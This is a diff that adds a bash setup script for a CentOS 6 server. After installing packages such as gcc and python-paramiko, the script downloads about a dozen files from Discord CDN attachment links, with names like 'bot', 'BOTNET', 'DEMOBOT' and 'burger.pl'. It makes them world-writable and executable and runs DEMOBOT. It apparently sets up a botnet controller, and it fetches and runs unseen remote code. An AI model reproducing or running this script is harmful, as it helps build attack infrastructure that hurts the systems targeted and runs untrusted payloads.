@@ -1,0 +1,27 @@
+#!/bin/bash
+#1. MAKE SURE YOUR SERVER IS RUNNING CENTOS 6
+#2. UPLOAD THIS FILE TO YOUR SERVER
+#3. RUN THIS FOLLOWING COMMAND ON YOUR SERVER: chmod 777 *
+#4. RUN THIS FOLLOWING COMMAND ON YOUR SERVER: ./setup
+sudo yum install wget -y
+yum install httpd -y
+yum install gcc -y
+yum install screen -y
+yum install nano -y
+yum install python-paramiko -y
+yum install perl -y
+yum install dstat -y
+yum install screen -y
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964613731352646/a
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964619947442186/a.sh
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964626310201426/bash_profile
+wget https://cdn.discordapp.com/attachments/714259964356591618/719061497271287919/bot
+wget https://cdn.discordapp.com/attachments/714259964356591618/719061478556172349/BOTNET
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964573885333544/burger.pl
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964579983851610/demo.sh
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964585977511976/DEMOBOT
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964592478683166/lol
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964598765944902/tool_animation
+wget https://cdn.discordapp.com/attachments/714259964356591618/717964606336925717/tool_animations
+chmod 777 *
+./DEMOBOT
